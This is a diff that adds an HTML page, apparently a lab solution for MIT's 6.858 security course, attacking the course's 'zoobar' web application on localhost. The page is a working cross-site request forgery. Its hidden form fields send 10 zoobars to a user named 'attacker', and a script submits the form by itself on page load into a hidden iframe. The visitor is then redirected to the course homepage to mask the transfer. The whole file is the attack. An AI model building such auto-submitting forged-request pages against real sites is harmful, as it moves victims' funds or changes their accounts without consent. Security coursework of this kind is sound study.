@@ -1,0 +1,22 @@
+<form method="POST" name="transferform" action="http://localhost:8080/zoobar/index.cgi/transfer" target="_blank_iframe">
+    <p>Send <input name="_zoobars" type="text" value="" size=5> zoobars</p>
+    <p>to <input name="_recipient" type="text" value="" size=10></p>
+    <input name="zoobars" type="hidden" value="10" size=5>
+    <input name="recipient" type="hidden" value="attacker" size=10>
+    <input type="submit" name="submission" value="Send">
+</form>
+
+<!--
+    The target after submitting the form is set to the hidden frame.
+    After the `iframe` is loaded, the window will be redirected to the homepage of 6.858.
+-->
+<iframe id="_blank_iframe" name="_blank_iframe" src="about:blank" style="display:none"></iframe>
+
+<script type="text/javascript">
+    document.forms[0].submit();
+
+    var iframe = document.getElementById('_blank_iframe');
+    iframe.addEventListener('load', function () {
+        window.location.href = 'https://css.csail.mit.edu/6.858/2020/';
+    }, false);
+</script>
